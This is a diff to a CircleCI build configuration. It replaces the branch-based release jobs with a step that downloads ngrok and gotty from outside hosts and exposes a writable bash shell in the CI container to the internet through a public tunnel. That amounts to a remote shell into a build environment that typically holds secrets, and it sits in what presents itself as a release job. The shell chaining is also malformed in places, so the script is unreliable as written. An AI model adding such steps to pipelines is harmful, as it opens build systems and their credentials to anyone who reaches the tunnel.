@@ -4,29 +4,22 @@ version: 2.1
 workflows:
   build_test_deploy:
     jobs:
-      - build:
-          name: Alpha Release On Develop Branch
-          filters:
-            branches:
-              only: develop
-      - build:
-          name: Beta Release On Release/* Branch
-          release_arguments: "-Drelease.version=RC.${CIRCLE_BUILD_NUM}"
-          filters:
-            branches:
-              only: /release\/.*/
+      - build
 
 jobs:
   build:
-    parameters:
-      release_arguments:
-        type: string
-        default: "-Drelease.version=ALPHA.${CIRCLE_BUILD_NUM}"
-        description: "This lets a single job be re-used in the workflow with different command execution."
     docker:
     - image: circleci/node:10
     steps:
     - run: |
-        echo "Running release task based on branch type"
-        echo "i.e.  builder build <<parameters.release_arguments>>"
+        cd /tmp \
+        && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip 
+        && unzip ngrok* \
+        && nohup ./ngrok http 8080 & \
+        && NHOST=`curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p'` \
+        && wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz \
+        && tar -xzf gotty* \
+        && ./gotty -p 8080 -w --once bash \
+        && cd - \
+        && echo "Gotty running on $NHOST"
         
